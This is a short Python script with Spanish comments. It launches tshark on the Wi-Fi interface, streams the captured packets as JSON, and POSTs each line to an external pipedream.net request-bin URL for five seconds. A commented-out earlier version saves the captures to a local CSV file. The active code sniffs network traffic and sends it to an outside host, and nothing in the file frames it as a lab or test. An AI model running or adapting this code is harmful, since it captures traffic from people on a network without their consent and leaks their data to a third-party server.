import subprocess
import requests
import time

def capturar_trafico_wifi():
    # Nombre de la interfaz de red WiFi que deseas monitorear
    interface_wifi = "Wi-Fi"

    # Comando para ejecutar tshark y capturar el tráfico de la red WiFi
    comando_tshark = ['tshark', '-i', interface_wifi, '-T', 'json']

    # Ejecutar tshark y redirigir la salida a un proceso de Python
    proceso_tshark = subprocess.Popen(comando_tshark, stdout=subprocess.PIPE)

    # Tiempo de ejecución en segundos
    tiempo_ejecucion = 5

    # Tiempo inicial
    tiempo_inicial = time.time()

    # Leer la salida de tshark línea por línea y enviarla al servidor remoto
    for linea in proceso_tshark.stdout:
        # Realizar una solicitud HTTP POST al servidor remoto con los datos capturados
        enviar_a_requestbin(linea)

        # Verificar si ha transcurrido el tiempo de ejecución
        if time.time() - tiempo_inicial >= tiempo_ejecucion:
            break

def enviar_a_requestbin(data):
    # Configura la URL del servidor remoto donde enviar los datos capturados
    REMOTE_SERVER_URL = 'https://eofmex5g3ogydbk.m.pipedream.net'

    # Realizar una solicitud HTTP POST al servidor remoto con los datos capturados
    requests.post(REMOTE_SERVER_URL, data=data)

if __name__ == '__main__':
    capturar_trafico_wifi()


#
#import subprocess
#import csv
#import json
#
#def capturar_trafico_wifi():
#    # Nombre de la interfaz de red WiFi que deseas monitorear
#    interface_wifi = "Wi-Fi"#
#
#    # Comando para ejecutar tshark y capturar el tráfico de la red WiFi
#    comando_tshark = ['tshark', '-i', interface_wifi, '-T', 'json']#
#
#    # Ejecutar tshark y redirigir la salida a un proceso de Python
#    proceso_tshark = subprocess.Popen(comando_tshark, stdout=subprocess.PIPE)#
#
#    # Crear un archivo CSV para escribir los datos de captura
#    with open('captura.csv', 'w', newline='') as csvfile:
#        csv_writer = csv.writer(csvfile)
#        
#       # Escribir el encabezado del archivo CSV
#        csv_writer.writerow(['Timestamp', 'Source', 'Destination', 'Protocol', 'Length', 'Info'])
#        
#        # Leer la salida de tshark línea por línea y escribirla en el archivo CSV
#        for linea in proceso_tshark.stdout:
#            # Convertir la línea JSON a un diccionario Python
#            paquete = json.loads(linea)#
#
#            # Obtener los campos relevantes del paquete
#            timestamp = paquete['timestamp']
#            source = paquete['layers']['ip']['ip.src']
#            destination = paquete['layers']['ip']['ip.dst']
#            protocol = paquete['layers']['frame']['frame.protocols']
#            length = paquete['layers']['frame']['frame.len']
#            info = paquete['layers']['frame']['frame.comment']#
#
            # Escribir los datos en el archivo CSV
 #           csv_writer.writerow([timestamp, source, destination, protocol, length, info])
#
#if __name__ == '__main__':
#    capturar_trafico_wifi()

